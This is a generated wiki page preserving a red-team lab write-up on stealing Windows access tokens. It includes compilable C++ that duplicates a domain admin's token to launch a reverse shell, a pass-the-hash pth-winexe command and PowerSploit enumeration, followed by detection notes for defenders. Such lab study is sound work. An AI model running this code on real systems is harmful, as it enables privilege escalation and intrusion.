---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Primary Access Token Manipulation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-privilege-escalation-t1134-access-token-manipulation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1134-access-token-manipulation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Primary Access Token Manipulation](../../topics/offensive-security/primary-access-token-manipulation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-privilege-escalation-t1134-access-token-manipulation |
| name | Primary Access Token Manipulation |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/privilege-escalation/t1134-access-token-manipulation.md |

## Preserved Source Material

````yaml
_asset_filenames:
- token-disasm (1).png
- token-logs.png
- token-new-logon-3 (1).png
- token-shell-impersonated.png
- tokens-all.png
- tokens-new-pid.png
- tokens-new-shell.png
- tokens-shell-c++.png
- tokens-victim-3060.png
- tokens-winexe.png
_body: "---\ndescription: >-\n  Defense Evasion, Privilege Escalation by stealing an re-using security access\n  tokens.\n\
  ---\n\n# Primary Access Token Manipulation\n\n## Context\n\nOne of the techniques of token manipulation is creating a new\
  \ process with a token \"stolen\" from another process. This is when a token of an already existing access token present\
  \ in one of the running processes on the victim host, is retrieved, duplicated and then used for creating a new process,\
  \ making the new process assume the privileges of that stolen token.\n\nA high level process of the token stealing that\
  \ will be carried out in this lab is as follows:\n\n| Step                                                         | Win32\
  \ API                 |\n| ------------------------------------------------------------ | ------------------------- |\n\
  | Open a process with access token you want to steal           | `OpenProcess`             |\n| Get a handle to the access\
  \ token of that process             | `OpenProcesToken`         |\n| Make a duplicate of the access token present in that\
  \ process | `DuplicateTokenEx`        |\n| Create a new process with the newly aquired access token     | `CreateProcessWithTokenW`\
  \ |\n\n## Weaponization\n\nBelow is the C++ code implementing the above process. Note the variable `PID_TO_IMPERSONATE`\
  \ that has a value of `3060` This is a process ID that we want to impersonate/steal the token from, since it is running\
  \ as a domain admin and makes it for a good target:\n\n![A victim cmd.exe process that is running under the context of DC\
  \ admin offense\\administrator](../../.gitbook/assets/tokens-victim-3060.png)\n\nNote the line 16, which specifies the executable\
  \ that should be launched with an impersonated token, which in our case effectively is a simple netcat reverse shell calling\
  \ back to the attacking system:\n\n![](../../.gitbook/assets/tokens-shell-c++.png)\n\nThis is the code if you want to compile\
  \ and try it yourself:\n\n{% code title=\"tokens.cpp\" %}\n```cpp\n#include \"stdafx.h\"\n#include <windows.h>\n#include\
  \ <iostream>\n\nint main(int argc, char * argv[]) {\n\tchar a;\n\tHANDLE processHandle;\n\tHANDLE tokenHandle = NULL;\n\t\
  HANDLE duplicateTokenHandle = NULL;\n\tSTARTUPINFO startupInfo;\n\tPROCESS_INFORMATION processInformation;\n\tDWORD PID_TO_IMPERSONATE\
  \ = 3060;\n\twchar_t cmdline[] = L\"C:\\\\shell.cmd\";\n\tZeroMemory(&startupInfo, sizeof(STARTUPINFO));\n\tZeroMemory(&processInformation,\
  \ sizeof(PROCESS_INFORMATION));\n\tstartupInfo.cb = sizeof(STARTUPINFO);\t\n\n\tprocessHandle = OpenProcess(PROCESS_ALL_ACCESS,\
  \ true, PID_TO_IMPERSONATE);\n\tOpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);\n\tDuplicateTokenEx(tokenHandle,\
  \ TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);\t\t\t\n\tCreateProcessWithTokenW(duplicateTokenHandle,\
  \ LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);\n\t\n\tstd::cin >> a;\n    return\
  \ 0;\n}\n```\n{% endcode %}\n\n## Execution\n\nLaunching `Tokens.exe` from the powershell console spawns a reverse shell\
  \ that the attacker catches. Note how the `powershell.exe` - the parent process of `Tokens.exe` and `Tokens.exe` itself\
  \ are running under `PC-Mantvydas\\mantvydas`, but the newly spawned shell is running under `OFFENSE\\Administrator` - this\
  \ is because of the successful token theft:\n\n![](../../.gitbook/assets/token-shell-impersonated.png)\n\nThe logon for\
  \ OFFESNE\\administrator in the above test was of logon type 2 (interactive logon, meaning I launched a new process on the\
  \ victim system using a `runas /user:administrator@offense cmd` command).&#x20;\n\nAnother quick test that I wanted to do\
  \ was a theft of an access token that was present in the system due to a network logon (i.e psexec, winexec, pth-winexe,\
  \ etc), so I spawned a cmd shell remotely from the attacking machine to the victim machine using:\n\n{% code title=\"attacker@local\"\
  \ %}\n```\npth-winexe //10.0.0.2 -U offense/administrator%pass cmd\n```\n{% endcode %}\n\nwhich created a new process on\
  \ the victim system with a PID of 4780:\n\n![](../../.gitbook/assets/tokens-winexe.png)\n\nEnumerating all the access tokens\
  \ on the victim system with PowerSploit:\n\n```csharp\nInvoke-TokenManipulation -ShowAll | ft -Wrap -Property domain,username,tokentype,logontype,processid\n\
  ```\n\n...gives the below. Note the available token (highlighted) - it is the cmd.exe from above screenshot and its logon\
  \ type is as expected - 3 - a network logon:\n\n![](../../.gitbook/assets/tokens-all.png)\n\nThis token again can be stolen\
  \ the same way we did it earlier. Let's change the PID in `Tokens.cpp` of the process we want to impersonate to `4780`:\n\
  \n![](../../.gitbook/assets/tokens-new-pid.png)\n\nRunning the compiled code invokes a new process with the newly stolen\
  \ token:\n\n![](../../.gitbook/assets/tokens-new-shell.png)\n\nnote the cmd.exe has a PID 5188 - if we rerun the `Invoke-TokenManipulation`,\
  \ we can see the new process is using the access token with logon type 3:\n\n![](<../../.gitbook/assets/token-new-logon-3\
  \ (1).png>)\n\n## Observations\n\nImagine you were investigating the host we stole the tokens from, because it exhibited\
  \ some anomalous behaviour. In this particularly contrived example, since `Tokens.exe` was written to the disk on the victim\
  \ system, you could have a quick look at its dissasembly and conclude it is attempting to manipulate access tokens - note\
  \ that we can see the victim process PID and the CMDLINE arguments:\n\n![](<../../.gitbook/assets/token-disasm (1).png>)\n\
  \nAs suggested by the above, you should think about API monitoring if you want to detect these token manipulations on endpoints,\
  \ but beware - this can be quite noisy.&#x20;\n\nWindows event logs of IDs `4672` and `4674` may be helpful for you as a\
  \ defender also - below shows a network logon of a `pth-winexe //10.0.0.2 -U offense/administrator%pass cmd` and then later,\
  \ a netcat reverse shell originating from the same logon session:\n\n![](../../.gitbook/assets/token-logs.png)\n\n## References\n\
  \n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1134\" %}\n\n{% embed url=\"https://digital-forensics.sans.org/blog/2012/03/21/protecting-privileged-domain-accounts-access-tokens\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly#-security-primary-token-gly\" %}\n\
  \n{% embed url=\"https://technet.microsoft.com/pt-pt/library/cc783557%28v=ws.10%29.aspx?f=255&MSPPError=-2147217396\" %}\n\
  \n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/secauthz/access-tokens\" %}\n\n{% embed url=\"https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/\"\
  \ %}\n\n{% embed url=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx\" %}\n\n{% embed\
  \ url=\"https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw\" %}\n\n{% embed\
  \ url=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx\" %}\n\n{% embed url=\"https://www.youtube.com/watch?v=Ed_2BKn3QR8\"\
  \ %}\n\n[https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf)"
_relative_path: offensive-security/privilege-escalation/t1134-access-token-manipulation.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1134-access-token-manipulation.md
````
